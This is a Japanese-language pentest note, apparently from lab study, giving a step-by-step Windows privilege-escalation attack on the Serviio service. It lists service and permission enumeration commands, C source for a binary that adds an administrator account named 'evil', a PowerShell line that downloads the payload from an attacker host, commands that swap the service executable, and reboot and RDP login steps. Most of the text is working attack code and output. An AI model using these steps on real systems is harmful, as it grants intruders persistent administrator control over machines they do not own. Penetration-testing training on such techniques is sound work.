# Insecure File Permissions

### Serviioサービスでのケーススタディ

NT権限で実行されるサービスの安全でないファイルパーミッションを悪用する方法

* 攻撃対象ホストのWin32サービスを列挙する

  ```powershell
  Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
  
  ・・・
  Serviio                      Running C:\Program Files\Serviio\bin\ServiioService.exe
  ```

  ※ユーザがダウンロードしたようなexeファイルがないかを確認する。特に`ProgramFIles`配下はユーザダウンロードしたアプリが入るので調査の価値あり

* icaclsを使って、対象サービスのパーミッションを列挙

  ```cmd
  icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
  ```

  権限の見方は以下

  | MASK | PERMISSIONS             |
  | ---- | ----------------------- |
  | F    | Full access             |
  | M    | Modify access           |
  | RX   | Read and execute access |
  | R    | Read-only access        |
  | W    | Write-only access       |

* 置き換え用のexeファイルを作成する

  ```c
  #include <stdlib.h>
  
  int main ()
  {
    int i;
    
    i = system ("net user evil Ev!lpass /add");
    i = system ("net localgroup administrators evil /add");
    
    return 0;
  }
  ```

  * クロスコンパイル

    ```bash
    i686-w64-mingw32-gcc adduser.c -o adduser.exe
    ```

* 攻撃対象ホストに配送し、置き換えする

  ```
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.144:5555/adduser.exe', 'adduser.exe')
  ```

  ```cmd
  move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
  move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
  dir "C:\Program Files\Serviio\bin\"
  ```

* サービスの再起動を試みる

  ```
  net stop Serviio
  ```

  →権限なし

* Serviioサービスの開始オプションを確認する

  ```cmd
  wmic service where caption="Serviio" get name, caption, state, startmode
  ---
  C:\Users\admin\Documents>wmic service where caption="Serviio" get name, caption, state, startmode
  Caption  Name     StartMode  State
  Serviio  Serviio  Auto       Running
  ```

  ※Autoに設定されており自動的に開始される

* システムの再起動の権限の確認

  ```
  whoami /priv
  
  ----
  PRIVILEGES INFORMATION
  ----------------------
  
  Privilege Name                Description                          State
  ============================= ==================================== ========
  SeShutdownPrivilege           Shut down the system                 Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
  SeUndockPrivilege             Remove computer from docking station Disabled
  SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
  SeTimeZonePrivilege           Change the time zone                 Disabled
  ```

  `SeShutDownPrivilege`の権利があり、再起動可能

* 再起動する

  ```
  shutdown /r /t 0
  ```

* 追加したユーザでログインしなおす

  ```
  rdesktop -g 95% -u evil -p 'Ev!lpass' 192.168.144.10
  ```

  ```
  net localgroup Administrators
  ```

  

